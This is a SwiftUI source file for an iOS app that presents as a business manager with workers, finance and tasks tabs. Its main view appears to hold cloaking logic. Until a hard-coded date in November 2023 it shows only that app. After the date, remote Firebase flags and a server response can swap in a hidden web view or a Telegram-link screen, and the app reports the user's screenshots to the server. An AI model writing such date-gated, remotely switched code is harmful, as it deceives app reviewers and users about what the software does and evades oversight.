//
//  ContentView.swift
//  App245
//
//  Created by IGOR on 13/11/2023.
//

import SwiftUI
import Amplitude

struct ContentView: View {
    
    @State var current_tab: String = "Main"
    @State var showMenu: Bool = false
    
    @State var server: String = ""
    
    @State var isDead: Bool = false
    @State var isTelegram: Bool = false
    
    @State var telegram: URL = URL(string: "h")!
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg3")
                .ignoresSafeArea()
            
            if server.isEmpty || telegram.absoluteString == "h" {
                
                LoadingView()
                
            } else {
                
                if server == "0" {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        U_1(telegram: telegram, isTelegram: isTelegram)
                    }
                    
                } else if server == "1" {
                    
                    if status {
                        
                        ZStack {
                            
                            MainView(show: $showMenu)
                                .opacity(current_tab == "Main" ? 1 : 0)
                            
                            WorkersView(show: $showMenu)
                                .opacity(current_tab == "Workers" ? 1 : 0)
                            
                            FinanceView(show: $showMenu)
                                .opacity(current_tab == "Finance" ? 1 : 0)
                            
                            TasksView(show: $showMenu, taskWorker: "ecd")
                                .opacity(current_tab == "Tasks" ? 1 : 0)
                            
                            MenuView(show: $showMenu, currentTab: $current_tab)
                        }
                        .onAppear {
                            
                            Amplitude.instance().logEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        Re_1()
                    }
                }
            }
        }
        .onAppear {
            
            check_data(isCaptured: false)
        }
        .onReceive(NotificationCenter.default.publisher(for: UIApplication.userDidTakeScreenshotNotification)) { _ in

            if server == "0" {
                
                check_data(isCaptured: true)
            }
        }
    }
    
    private func check_data(isCaptured: Bool) {
        
        getFirebaseData(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            getFirebaseData(field: "isTelegram", dataType: .bool) { result2 in
                
                let result2 = result2 as? Bool ?? false
                isTelegram = result2
            
                getFirebaseData(field: "telegram", dataType: .url) { result3 in
                    
                    let result3 = result3 as? URL ?? URL(string: "nil")!
                    telegram = result3
                    
                    let repository = RepositorySecond()
                    let myData = MyDataClass.getMyData()
                    let now = Date().timeIntervalSince1970

                    var dateComponents = DateComponents()
                    dateComponents.year = 2023
                    dateComponents.month = 11
                    dateComponents.day = 23

                    let targetDate = Calendar.current.date(from: dateComponents)!
                    let targetUnixTime = targetDate.timeIntervalSince1970
                    
                    guard now > targetUnixTime else {

                        server = "1"

                        return
                    }
                    
                    repository.post(isCaptured: isCaptured, isCast: false, mydata: myData) { result in
                        
                        switch result {
                        case .success(let data):
                            if "\(data)" == "" {
                                
                                self.server = "1"
                                
                            } else {
                                
                                self.server = "\(data)"
                            }
                            
                        case .failure(_):
                            
                            if self.isDead == true {
                                
                                self.server = "0"
                                
                            } else {
                                
                                self.server = "1"
                            }
                        }
                    }
                }
            }
        }
    }
}

#Preview {
    ContentView()
}
